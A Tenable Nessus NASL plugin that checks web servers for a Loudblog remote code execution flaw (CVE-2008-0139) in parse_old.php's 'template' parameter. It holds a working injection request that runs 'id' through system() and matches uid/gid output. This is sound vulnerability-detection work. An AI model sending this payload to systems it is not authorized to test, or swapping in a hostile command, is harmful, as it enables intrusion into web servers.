#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(29869);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2008-0139");
  script_bugtraq_id(27157);
  script_xref(name:"milw0rm", value:"4849");
  script_xref(name:"OSVDB", value:"40200");
  script_xref(name:"Secunia", value:"28336");

  script_name(english:"Loudblog loudblog/inc/parse_old.php template Parameter Arbitrary Remote Code Execution");
  script_summary(english:"Tries to run a command using Loudblog");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows arbitrary
command execution." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Loudblog, a PHP application for publishing
podcasts and similar media files. 

The version of Loudblog on the remote host fails to sanitize input to
the 'template' parameter of the 'loudblog/inc/parse_old.php' script
before using it in an 'eval()' statement to evaluate PHP code. 
Provided PHP's 'register_globals' setting is enabled, an
unauthenticated attacker can leverage this issue to execute arbitrary
code on the remote host subject to the privileges of the web server
user id." );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/4849" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P" );
 script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) extra_dirs = list_uniq(make_list("/loudblog", "/podcast", "/podcasts", cgi_dirs()));
else extra_dirs = make_list(cgi_dirs());

# Try to exploit the issue to run a command.
cmd = "id";
url = string(
  "/loudblog/inc/parse_old.php?",
  "template=@system(", urlencode(str:cmd), ");@&",
  "php_use=1&",
  "phpseparator=@"
);

http_check_remote_code(
  extra_dirs    : extra_dirs,
  check_request : url,
  check_result  : "uid=[0-9]+.*gid=[0-9]+.*",
  warning       : TRUE,
  command       : cmd,
  port          : port
);
